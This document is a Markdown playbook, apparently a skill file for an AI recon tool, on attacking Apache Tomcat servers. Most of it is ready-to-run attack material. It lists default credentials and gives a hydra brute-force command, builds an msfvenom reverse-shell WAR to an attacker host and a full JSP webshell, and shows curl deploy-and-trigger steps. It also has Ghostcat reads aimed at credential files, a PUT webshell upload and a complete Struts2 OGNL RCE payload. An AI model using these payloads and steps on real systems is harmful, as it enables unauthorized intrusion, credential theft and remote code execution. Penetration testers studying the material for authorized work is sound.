<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: tomcat
description: Security testing playbook for Apache Tomcat covering manager app RCE, AJP Ghostcat, default credentials, WAR file deployment, and Tomcat-specific misconfigurations
---

# Apache Tomcat Security Testing

Tomcat is the most common Java servlet container. Critical attack surface: manager app with default credentials enabling WAR file upload (instant RCE), AJP Ghostcat (CVE-2020-1938) for file read, and host-manager misconfigurations.

---

## Reconnaissance

### Discovery

    # Port scanning
    nmap -p 8080,8443,8009,8005 <target> -sV --open

    # Ports:
    # 8080  — Tomcat HTTP
    # 8443  — Tomcat HTTPS
    # 8009  — AJP connector (Ghostcat target)
    # 8005  — Shutdown port (bind to 127.0.0.1 normally)

    # Tomcat fingerprinting:
    GET /                       # Default page or deployed app
    GET /index.jsp              # JSP extension = Java servlet container
    GET /examples/              # Tomcat example apps (reveals version)
    GET /docs/                  # Tomcat docs (version in title)
    # Error page shows Tomcat version: "Apache Tomcat/9.0.65"

---

## Manager Application

The Tomcat Manager deploys/undeploys WARs and provides server status:

    # Manager app paths
    GET /manager/html               # Web-based Manager GUI
    GET /manager/text               # Text-based Manager API
    GET /manager/status             # Server status (JVM, threads, requests)
    GET /host-manager/html          # Virtual host manager

    # Default credentials (try all):
    tomcat:tomcat
    admin:admin
    admin:password
    admin:
    tomcat:s3cret
    both:tomcat
    role1:tomcat
    manager:manager
    root:root

    # Brute force Manager:
    hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/rockyou.txt \
      <target> http-get /manager/html

    # curl with basic auth:
    curl -u tomcat:tomcat http://<target>:8080/manager/html

---

## WAR File Upload → RCE

If Manager credentials found, deploy malicious WAR for webshell:

    # Method 1: msfvenom WAR payload
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f war -o shell.war

    # Method 2: Manual JSP webshell in WAR
    mkdir -p /tmp/webshell/WEB-INF
    cat > /tmp/webshell/cmd.jsp << 'EOF'
    <%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
        InputStream in = p.getInputStream();
        int c;
        while ((c = in.read()) != -1) out.print((char)c);
        p.waitFor();
    }
    %>
    EOF
    cat > /tmp/webshell/WEB-INF/web.xml << 'EOF'
    <?xml version="1.0" encoding="UTF-8"?>
    <web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
    </web-app>
    EOF
    cd /tmp/webshell && jar -cvf shell.war .

    # Deploy WAR via Manager API:
    curl -u tomcat:tomcat \
      "http://<target>:8080/manager/text/deploy?path=/shell&update=true" \
      --upload-file shell.war

    # Trigger webshell:
    curl "http://<target>:8080/shell/cmd.jsp?cmd=id"

    # Undeploy (cleanup):
    curl -u tomcat:tomcat "http://<target>:8080/manager/text/undeploy?path=/shell"

    # Metasploit:
    use exploit/multi/http/tomcat_mgr_upload
    set RHOSTS <target>
    set RPORT 8080
    set HttpUsername tomcat
    set HttpPassword tomcat
    run

---

## AJP Ghostcat (CVE-2020-1938)

AJP port 8009 allows reading arbitrary files from the Tomcat webapp (no auth):

    # Check if AJP is exposed:
    nmap -p 8009 <target>

    # Ghostcat — read arbitrary files from webapp:
    # Tool: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

    python3 ajpShooter.py http://<target> 8009 /WEB-INF/web.xml read
    python3 ajpShooter.py http://<target> 8009 /WEB-INF/classes/application.properties read

    # Read sensitive files via AJP:
    python3 ajpShooter.py http://<target> 8009 /META-INF/context.xml read    # DB creds
    python3 ajpShooter.py http://<target> 8009 /WEB-INF/spring/root-context.xml read

    # If JSP file upload exists → RCE via AJP:
    # 1. Upload a JSP file (any file upload endpoint)
    # 2. Include uploaded file via AJP: ajpShooter.py ... /uploads/shell.jpg exec

    # Nuclei:
    nuclei -t cves/2020/CVE-2020-1938.yaml -u http://<target>:8009/

---

## Tomcat Configuration Files

    # If Manager access exists, read config files:

    # tomcat-users.xml — all credentials:
    GET /manager/text/serverinfo                 # JVM + OS info
    # File location: $CATALINA_HOME/conf/tomcat-users.xml

    # Via LFI or file read primitives:
    /etc/tomcat9/tomcat-users.xml
    /usr/share/tomcat9/conf/tomcat-users.xml
    /opt/tomcat/conf/tomcat-users.xml
    $CATALINA_HOME/conf/server.xml              # AJP config, ports, connectors
    $CATALINA_HOME/conf/web.xml                 # Default servlet config

    # Key fields in server.xml:
    <Connector port="8009" protocol="AJP/1.3" ... />   # AJP connector
    # If requiredSecret not set = vulnerable to Ghostcat

---

## Default Web Applications

Tomcat ships with example applications — always check:

    GET /examples/                  # Servlet and JSP examples
    GET /examples/servlets/         # Servlet demos
    GET /examples/jsp/              # JSP demos (may have file read)
    GET /examples/jsp/snp/snoop.jsp # HTTP request info (headers, session)
    GET /examples/jsp/source.jsp    # JSP source code viewer
    GET /host-manager/              # Virtual host manager
    GET /ROOT/                      # Default ROOT webapp

---

## CVE Exploitation

| CVE | Tomcat Version | Impact |
|-----|---------------|--------|
| CVE-2020-1938 | < 9.0.31, < 8.5.51, < 7.0.100 | AJP file read / RCE (Ghostcat) |
| CVE-2017-12617 | < 9.0.1, < 8.5.23, < 8.0.47, < 7.0.82 | JSP upload via PUT + RCE |
| CVE-2019-0232 | Windows, CGI servlet | RCE via CGI arguments |
| CVE-2016-4438 | Struts 2 (on Tomcat) | RCE via OGNL injection |
| CVE-2014-0094 | Struts 2 | ClassLoader manipulation |

    # CVE-2017-12617 — JSP upload via HTTP PUT:
    curl -X PUT "http://<target>:8080/shell.jsp/" \
      -d "<%Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"id\"});%>"
    # Note trailing slash — bypasses restriction

    # Access webshell:
    GET /shell.jsp

    # Nuclei:
    nuclei -t cves/ -tags tomcat -u http://<target>:8080/

---

## Struts 2 (Commonly Deployed on Tomcat)

Apache Struts is a Java MVC framework frequently deployed on Tomcat:

    # Struts 2 fingerprinting:
    GET /*.action                   # Action extension
    GET /*.do                       # Alternative extension
    # Error pages may show Struts version

    # OGNL injection (Struts 2 RCE):
    # CVE-2017-5638 (S2-045) — Content-Type header:
    curl -X POST http://<target>/example/Login.action \
      -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    # Automated Struts2 scanner:
    python3 struts-pwn.py --url http://<target>/*.action --cmd id

---

## Pro Tips

1. Try ALL default credential combinations — `tomcat:s3cret` and `admin:admin` are most common
2. AJP port 8009 often not firewalled internally — Ghostcat is zero-credential file read
3. CVE-2017-12617 (PUT JSP upload) is still common on unpatched Tomcat < 8.5.23
4. `/examples/` apps should never be in production — check for source.jsp file reader
5. Struts 2 on Tomcat is an extremely high-value target — OGNL injection = RCE
6. `tomcat-users.xml` contains plaintext passwords — read via Ghostcat or LFI
7. WAR deployment via Manager with minimal permissions (deploy role only) is common

## Summary

Tomcat testing = Manager app with default creds → WAR upload RCE + AJP port 8009 Ghostcat file read + CVE-2017-12617 PUT JSP upload. Manager app + `tomcat:tomcat` = instant RCE via WAR deploy in 30 seconds. AJP Ghostcat is zero-credential arbitrary file read — read `tomcat-users.xml`, `web.xml`, and database config files. Always check for Struts 2 if `.action` or `.do` extensions appear — OGNL injection is still one of the most impactful Java RCEs.
